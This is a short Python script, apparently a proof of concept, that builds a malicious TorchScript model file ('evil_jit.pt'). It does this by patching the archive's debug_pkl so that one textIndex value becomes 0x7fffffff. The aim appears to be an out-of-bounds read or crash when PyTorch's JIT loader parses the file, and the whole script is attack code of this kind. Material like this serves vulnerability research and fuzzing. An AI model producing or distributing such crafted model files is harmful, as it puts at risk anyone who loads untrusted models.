import zipfile
import shutil
import sys
import struct

src = "/tmp/clean.pt"
dst = "/tmp/evil_jit.pt"

zin = zipfile.ZipFile(src)
names = zin.namelist()
dbg_name = [n for n in names if n.endswith(".debug_pkl")][0]
dbg = zin.read(dbg_name)

# textIndex byte sequence K1 K2 K3 K4 K0  -> replace K4 (0x4b04) with BININT 0x7fffffff (0x4a ff ff ff 7f)
needle = b"\x4b\x01\x4b\x02\x4b\x03\x4b\x04\x4b\x00"
assert needle in dbg, "textIndex pattern not found"
repl = b"\x4b\x01\x4b\x02\x4b\x03" + b"\x4a\xff\xff\xff\x7f" + b"\x4b\x00"
dbg2 = dbg.replace(needle, repl, 1)
print(f"patched debug_pkl: {len(dbg)} -> {len(dbg2)} bytes (textIndex[3] = 4 -> 0x7fffffff)")

# rewrite zip
with zipfile.ZipFile(dst, "w", zipfile.ZIP_STORED) as zout:
    for n in names:
        data = dbg2 if n == dbg_name else zin.read(n)
        zout.writestr(n, data)
print("wrote", dst)
